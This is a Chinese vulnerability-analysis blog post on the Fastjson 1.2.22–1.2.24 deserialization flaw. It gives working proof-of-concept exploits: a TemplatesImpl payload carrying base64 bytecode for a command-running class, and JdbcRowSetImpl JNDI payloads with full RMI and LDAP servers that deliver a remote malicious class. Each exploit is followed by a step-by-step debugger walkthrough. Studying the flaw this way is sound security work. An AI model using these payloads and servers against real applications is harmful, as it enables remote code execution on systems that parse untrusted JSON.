# Fastjson系列二——1.2.22-1.2.24反序列化漏洞

2019-11-07 / [Java](https://www.mi1k7ea.com/tags/Java/)[Web安全](https://www.mi1k7ea.com/tags/Web安全/)

## 0x01 影响版本

Fastjson 1.2.x系列的1.2.22-1.2.24版本。

## 0x02 复现

对于Fastjson 1.2.22-1.2.24 版本的反序列化漏洞的利用，目前已知的主要有以下的利用链：

- 基于TemplateImpl；
- 基于JNDI（又分为基于Bean Property类型和Field类型）；

### 需要的jar包

我本地用的是fastjson-1.2.24.jar，commons-codec-1.12.jar，commons-io-2.5.jar，另外基于JdbcRowSetImpl调用链的利用还需要unboundid-ldapsdk-4.0.9.jar。

### 基于TemplateImpl的利用链

这部分代码参考的[廖新喜大佬的博客](http://xxlegend.com/2017/05/03/title- fastjson 远程反序列化poc的构造和分析/)。

#### 限制

需要设置Feature.SupportNonPublicField进行反序列化操作才能成功触发利用。

#### 复现利用

恶意类Test.java，用于弹计算器，至于为啥需要继承AbstractTranslet类在后面的调试分析中会具体看到：

```
public class Test extends AbstractTranslet {
    public Test() throws IOException {
        Runtime.getRuntime().exec("calc");
    }
    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) {
    }
    @Override
    public void transform(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers) throws TransletException {
    }
    public static void main(String[] args) throws Exception {
        Test t = new Test();
    }
}
```

PoC.java，Fastjson反序列化漏洞点，Feature.SupportNonPublicField必须设置，readClass()方法用于将恶意类的二进制数据进行Base64编码，至于为何要进行编码在后面会讲到：

```
public class PoC {
    public static String readClass(String cls){
        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        try {
            IOUtils.copy(new FileInputStream(new File(cls)), bos);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return Base64.encodeBase64String(bos.toByteArray());
    }
    
    public static void main(String args[]){
        try {
            ParserConfig config = new ParserConfig();
            final String fileSeparator = System.getProperty("file.separator");
            final String evilClassPath = System.getProperty("user.dir") + "\\out\\production\\FJTest\\Test.class";
            String evilCode = readClass(evilClassPath);
            final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
            String text1 = "{\"@type\":\"" + NASTY_CLASS +
                    "\",\"_bytecodes\":[\""+evilCode+"\"],'_name':'a.b','_tfactory':{ },\"_outputProperties\":{ }," +
                    "\"_name\":\"a\",\"_version\":\"1.0\",\"allowedProtocols\":\"all\"}\n";
            System.out.println(text1);

            Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
            //Object obj = JSON.parse(text1, Feature.SupportNonPublicField);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

运行即可弹出计算器：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/1.png)

关键看输出的构造的PoC：

```
{"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["yv66vgAAADMANAoABwAlCgAmACcIACgKACYAKQcAKgoABQAlBwArAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAZMVGVzdDsBAApFeGNlcHRpb25zBwAsAQAJdHJhbnNmb3JtAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaXRlcmF0b3IBADVMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yOwEAB2hhbmRsZXIBAEFMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7BwAtAQAEbWFpbgEAFihbTGphdmEvbGFuZy9TdHJpbmc7KVYBAARhcmdzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEAAXQHAC4BAApTb3VyY2VGaWxlAQAJVGVzdC5qYXZhDAAIAAkHAC8MADAAMQEABGNhbGMMADIAMwEABFRlc3QBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQATamF2YS9pby9JT0V4Y2VwdGlvbgEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7ACEABQAHAAAAAAAEAAEACAAJAAIACgAAAEAAAgABAAAADiq3AAG4AAISA7YABFexAAAAAgALAAAADgADAAAACgAEAAsADQAMAAwAAAAMAAEAAAAOAA0ADgAAAA8AAAAEAAEAEAABABEAEgABAAoAAABJAAAABAAAAAGxAAAAAgALAAAABgABAAAADwAMAAAAKgAEAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABUAFgACAAAAAQAXABgAAwABABEAGQACAAoAAAA/AAAAAwAAAAGxAAAAAgALAAAABgABAAAAEgAMAAAAIAADAAAAAQANAA4AAAAAAAEAEwAUAAEAAAABABoAGwACAA8AAAAEAAEAHAAJAB0AHgACAAoAAABBAAIAAgAAAAm7AAVZtwAGTLEAAAACAAsAAAAKAAIAAAAUAAgAFQAMAAAAFgACAAAACQAfACAAAAAIAAEAIQAOAAEADwAAAAQAAQAiAAEAIwAAAAIAJA=="],'_name':'a.b','_tfactory':{ },"_outputProperties":{ },"_name":"a","_version":"1.0","allowedProtocols":"all"}
```

PoC中几个重要的Json键的含义：

- **@type**——指定的解析类，即`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，Fastjson根据指定类去反序列化得到该类的实例，在默认情况下只会去反序列化public修饰的属性，在PoC中，`_bytecodes`和`_name`都是私有属性，所以想要反序列化这两个属性，需要在`parseObject()`时设置`Feature.SupportNonPublicField`；
- **_bytecodes**——是我们把恶意类的.class文件二进制格式进行Base64编码后得到的字符串；
- **_outputProperties**——漏洞利用链的关键会调用其参数的getOutputProperties()方法，进而导致命令执行；
- **_tfactory:{}**——在defineTransletClasses()时会调用getExternalExtensionsMap()，当为null时会报错，所以要对_tfactory设置；

#### 调试分析

下面我们直接在反序列化的那句代码上打上断点进行调试分析：

```
Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);
```

在JSON.parseObject()中会调用DefaultJSONParser.parseObject()，而DefaultJSONParser.parseObject()中调用了JavaObjectDeserializer.deserialze()函数进行反序列化：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/2.png)

跟进该函数，发现会返回去调用DefaultJSONParser.parse()函数：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/3.png)

继续调试，在DefaultJSONParser.parse()里是对JSON内容进行扫描，在switch语句中匹配上了”{“即对应12，然后对JSON数据调用DefaultJSONParser.parseObject()进行解析：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/4.png)

在DefaultJSONParser.parseObject()中，通过for语句循环解析JSON数据内容，其中skipWhitespace()函数用于去除数据中的空格字符，然后获取当前字符是否为双引号，是的话就调用scanSymbol()获取双引号内的内容，这里得到第一个双引号里的内容为”@type”：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/5.png)

往下调试，判断key是否为@type且是否关闭了Feature.DisableSpecialKeyDetect设置，通过判断后调用scanSymbol()获取到了@type对应的指定类`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl`，并调用TypeUtils.loadClass()函数加载该类：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/6.png)

跟进去，看到如红框的两个判断语句代码逻辑，是判断当前类名是否以”[“开头或以”L”开头以”;”结尾，当然本次调试分析是不会进入到这两个逻辑，但是后面的补丁绕过中利用到了这两个条件判断，也就是说**这两个判断条件是后面补丁绕过的漏洞点**，值得注意：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/8.png)

往下看，通过ClassLoader.loadClass()加载到目标类后，然后将该类名和类缓存到Map中，最后返回该加载的类：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/7.png)

返回后，程序继续回到DefaultJSONParser.parseObject()中往下执行，在最后调用JavaBeanDeserializer.deserialze()对目标类进行反序列化：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/9.png)

跟进去，循环扫描解析，解析到key为`_bytecodes`时，调用parseField()进一步解析：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/10.png)

在parseField()中，会调用DefaultFieldDeserializer.parseField()对`_bytecodes`对应的内容进行解析：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/11.png)

跟进DefaultFieldDeserializer.parseField()函数中，解析出`_bytecodes`对应的内容后，会调用setValue()函数设置对应的值，这里value即为恶意类二进制内容Base64编码后的数据：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/12.png)

FieldDeserializer.setValue()函数，看到是调用`private byte[][] com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl._bytecodes`的set方法来设置`_bytecodes`的值：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/13.png)

返回之后，后面也是一样的，循环处理JSON数据中的其他键值内容。

当解析到`_outputProperties`的内容时，看到前面的下划线被去掉了：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/14.png)

跟进该方法，发现会通过反射机制调用`com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()`方法，可以看到该方法类型是Properties、满足之前我们得到的结论即Fastjson反序列化会调用被反序列化的类的某些满足条件的getter方法：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/15.png)

跟进去，在getOutputProperties()方法中调用了newTransformer().getOutputProperties()方法：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/16.png)

跟进TemplatesImpl.newTransformer()方法，看到调用了getTransletInstance()方法：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/17.png)

继续跟进去查看getTransletInstance()方法，可以看到已经解析到Test类并新建一个Test类实例，注意前面会先调用defineTransletClasses()方法来生成一个Java类（Test类）：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/18.png)

再往下就是新建Test类实例的过程，并调用Test类的构造函数：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/19.png)

再之后就是弹计算器了。

**整个调试过程主要的函数调用栈如下：**

```
<init>:11, Test
newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect)
newInstance:57, NativeConstructorAccessorImpl (sun.reflect)
newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect)
newInstance:526, Constructor (java.lang.reflect)
newInstance:383, Class (java.lang)
getTransletInstance:408, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
newTransformer:439, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
getOutputProperties:460, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax)
invoke0:-1, NativeMethodAccessorImpl (sun.reflect)
invoke:57, NativeMethodAccessorImpl (sun.reflect)
invoke:43, DelegatingMethodAccessorImpl (sun.reflect)
invoke:606, Method (java.lang.reflect)
setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer)
parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:45, JavaObjectDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:302, JSON (com.alibaba.fastjson)
main:35, PoC
```

最后的调用过滤再具体说下：在getTransletInstance()函数中调用了defineTransletClasses()函数，在defineTransletClasses()函数中会根据_bytecodes来生成一个Java类（这里为恶意类Test），其构造方法中含有命令执行代码，生成的Java类随后会被newInstance()方法调用生成一个实例对象，从而该类的构造函数被自动调用，进而造成任意代码执行。

#### 为什么恶意类需要继承AbstractTranslet类

在前面的调试分析中，getTransletInstance()函数会先调用defineTransletClasses()方法来生成一个Java类，我们跟进这个defineTransletClasses()方法查看下：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/35.png)

可以看到有个逻辑会判断恶意类的父类类名是否是`ABSTRACT_TRANSLET`，是的话`_transletIndex`变量的值被设置为0，到后面的if判断语句中就不会被识别为<0而抛出异常终止程序。

#### 为什么需要对_bytecodes进行Base64编码

可以发现，在PoC中的`_bytecodes`字段是经过Base64编码的。为什么要怎么做呢？分析Fastjson对JSON字符串的解析过程，原理Fastjson提取byte[]数组字段值时会进行Base64解码，所以我们构造payload时需要对`_bytecodes`字段进行Base64加密处理。

其中Fastjson的处理代码如下，在ObjectArrayCodec.deserialze()函数中会调用lexer.bytesValue()对byte数组进行处理：

```
public <T> T deserialze(DefaultJSONParser parser, Type type, Object fieldName) {
    final JSONLexer lexer = parser.lexer;
    if (lexer.token() == JSONToken.NULL) {
        lexer.nextToken(JSONToken.COMMA);
        return null;
    }

    if (lexer.token() == JSONToken.LITERAL_STRING) {
        byte[] bytes = lexer.bytesValue();
        lexer.nextToken(JSONToken.COMMA);
        return (T) bytes;
    }
```

我们调试看看ObjectArrayCodec.deserialze()函数是在哪调用的，其实它的调用实在setValue()前面进行处理的：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20.png)

跟进几层，看到调用栈就清楚了，实在ObjectArrayCodec.deserialze()函数中调用到的：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/21.png)

跟进bytesValue()函数，就是对`_bytecodes`的内容进行Base64解码：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/22.png)

#### 为什么需要设置_tfactory为{}

由前面的调试分析知道，在getTransletInstance()函数中调用了defineTransletClasses()函数，defineTransletClasses()函数是用于生成Java类的，在其中会新建一个转换类加载器，其中会调用到`_tfactory.getExternalExtensionsMap()`方法，若`_tfactory`为null则会导致这段代码报错、从而无法生成恶意类，进而无法成功攻击利用：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/24.png)

#### 为什么反序列化调用getter方法时会调用到TemplatesImpl.getOutputProperties()方法

getOutputProperties()方法是个无参数的非静态的getter方法，以get开头且第四个字母为大写形式，其返回值类型是Properties即继承自Map类型，满足之前文章[《Fastjson系列一——反序列化漏洞基本原理》](https://www.mi1k7ea.com/2019/11/03/Fastjson系列一——反序列化漏洞基本原理/#小结)说的Fastjson反序列化时会调用的getter方法的条件，因此在使用Fastjson对TemplatesImpl类对象进行反序列化操作时会自动调用getOutputProperties()方法。

#### 如何关联_outputProperties与getOutputProperties()方法

Fastjson会语义分析JSON字符串，根据字段key，调用fieldList数组中存储的相应方法进行变量初始化赋值。

具体的代码在JavaBeanDeserializer.parseField()中，其中调用了smartMatch()方法：

```
public boolean parseField(DefaultJSONParser parser, String key, Object object, Type objectType, Map<String, Object> fieldValues) {
        JSONLexer lexer = parser.lexer; // xxx

        FieldDeserializer fieldDeserializer = smartMatch(key);
```

在JavaBeanDeserializer.smartMatch()方法中，会替换掉字段key中的`_`，从而使得`_outputProperties`变成了outputProperties：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/23.png)

既然已经得到了outputProperties属性了，那么自然而然就会调用到getOutputProperties()方法了。

### 基于JdbcRowSetImpl的利用链

基于JdbcRowSetImpl的利用链主要有两种利用方式，即JNDI+RMI和JNDI+LDAP，都是属于基于Bean Property类型的JNDI的利用方式。

关于JNDI注入的相关概念，可以参考之前的文章[《浅析JNDI注入》](https://www.mi1k7ea.com/2019/09/15/浅析JNDI注入/)。

#### 限制

由于是利用JNDI注入漏洞来触发的，因此主要的限制因素是JDK版本。

基于RMI利用的JDK版本<=6u141、7u131、8u121，基于LDAP利用的JDK版本<=6u211、7u201、8u191。

#### JNDI+RMI复现利用

PoC如下，@type指向com.sun.rowset.JdbcRowSetImpl类，dataSourceName值为RMI服务中心绑定的Exploit服务，autoCommit有且必须为true或false等布尔值类型：

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"rmi://localhost:1099/Exploit", "autoCommit":true}
```

JNDIServer.java，RMI服务，注册表绑定了Exploit服务，该服务是指向恶意Exploit.class文件所在服务器的Reference：

```
public class JNDIServer {
    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://127.0.0.1:8000/Exploit.class即可
        Reference reference = new Reference("Exloit",
                "Exploit","http://127.0.0.1:8000/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("Exploit",referenceWrapper);
    }
}
```

Exploit.java，恶意类，单独编译成class文件并放置于RMI服务指向的三方Web服务中，作为一个Factory绑定在注册表服务中：

```
public class Exploit{
    public Exploit() {
        try {
            String[] cmds = System.getProperty("os.name").toLowerCase().contains("win")
                    ? new String[]{"cmd.exe","/c", "calc.exe"}
                    : new String[]{"/bin/bash","-c", "touch /tmp/hacked"};
            Runtime.getRuntime().exec(cmds);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        Exploit e = new Exploit();
    }
}
```

JdbcRowSetImplPoc.java：

```
public class JdbcRowSetImplPoc {
    public static void main(String[] argv){
        String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:1099/Exploit\", \"autoCommit\":true}";
        JSON.parse(payload);
    }
}
```

先运行JNDI的RMI服务，将恶意类Exploit.class单独放置于一个三方的Web服务中，然后运行PoC即可弹计算器，且看到访问了含有恶意类的Web服务：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/25.png)

#### JNDI+LDAP复现利用

PoC如下，跟RMI的相比只是改了URL而已：

```
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://localhost:1389/Exploit", "autoCommit":true}
```

但是相比RMI的利用方式，优势在于JDK的限制更低了。

LdapServer.java，区别在于将之前的RMI服务端换成LDAP服务端：

```
public class LdapServer {

    private static final String LDAP_BASE = "dc=example,dc=com";


    public static void main (String[] args) {

        String url = "http://127.0.0.1:8000/#Exploit";
        int port = 1389;


        try {
            InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE);
            config.setListenerConfigs(new InMemoryListenerConfig(
                    "listen",
                    InetAddress.getByName("0.0.0.0"),
                    port,
                    ServerSocketFactory.getDefault(),
                    SocketFactory.getDefault(),
                    (SSLSocketFactory) SSLSocketFactory.getDefault()));

            config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url)));
            InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config);
            System.out.println("Listening on 0.0.0.0:" + port);
            ds.startListening();

        }
        catch ( Exception e ) {
            e.printStackTrace();
        }
    }

    private static class OperationInterceptor extends InMemoryOperationInterceptor {

        private URL codebase;


        /**
         *
         */
        public OperationInterceptor ( URL cb ) {
            this.codebase = cb;
        }


        /**
         * {@inheritDoc}
         *
         * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult)
         */
        @Override
        public void processSearchResult ( InMemoryInterceptedSearchResult result ) {
            String base = result.getRequest().getBaseDN();
            Entry e = new Entry(base);
            try {
                sendResult(result, base, e);
            }
            catch ( Exception e1 ) {
                e1.printStackTrace();
            }

        }


        protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException {
            URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(".class"));
            System.out.println("Send LDAP reference result for " + base + " redirecting to " + turl);
            e.addAttribute("javaClassName", "Exploit");
            String cbstring = this.codebase.toString();
            int refPos = cbstring.indexOf('#');
            if ( refPos > 0 ) {
                cbstring = cbstring.substring(0, refPos);
            }
            e.addAttribute("javaCodeBase", cbstring);
            e.addAttribute("objectClass", "javaNamingReference");
            e.addAttribute("javaFactory", this.codebase.getRef());
            result.sendSearchEntry(e);
            result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
        }

    }
}
```

Exploit.java不变。

JdbcRowSetImplPoC.java中修改payload中的dataSourceName的值为指向LDAP服务端地址即可：

```
String payload = "{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:1389/Exploit\", \"autoCommit\":true}";
```

和RMI同样的利用方式，能成功弹计算器：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/26.png)

#### 调试分析

虽然前面两个复现利用是用的不同的服务，但是都是利用了com.sun.rowset.JdbcRowSetImpl这条利用链来触发的，漏洞点都是JNDI注入导致的。

在`JSON.parse(payload);`处打下断点开始往下调试。

前面的函数调用过程和基于TemplateImpl的调试分析几乎是一样的，只看下区别的地方。

调用scanSymbol()函数扫描到com.sun.rowset.JdbcRowSetImpl类后，再调用TypeUtils.loadClass()函数将该类加载进来：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/27.png)

往下调试，调用了FastjsonASMDeserializer.deserialze()函数对该类进行反序列化操作：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/28.png)

继续往下调试，就是ASM机制生成的临时代码了，这些代码是下不了断点、也看不到，直接继续往下调试即可。

由于PoC设置了dataSourceName键值和autoCommit键值，因此在JdbcRowSetImpl中的setDataSourceName()和setAutoCommit()函数都会被调用，因为它们均满足前面说到的Fastjson在反序列化时会自动调用的setter方法的特征。

先是调试到了setDataSourceName()函数，将dataSourceName值设置为目标RMI服务的地址：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/29.png)

接着调用到setAutoCommit()函数，设置autoCommit值，其中调用了connect()函数：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/30.png)

跟进connect()函数，看到了熟悉的JNDI注入的代码即`InitialContext.lookup()`，并且其参数是调用`this.getDataSourceName()`获取的、即在前面setDataSourceName()函数中设置的值，因此lookup参数外部可控，导致存在JNDI注入漏洞：

![img](https://www.mi1k7ea.com/2019/11/07/Fastjson%E7%B3%BB%E5%88%97%E4%BA%8C%E2%80%94%E2%80%941-2-22-1-2-24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/31.png)

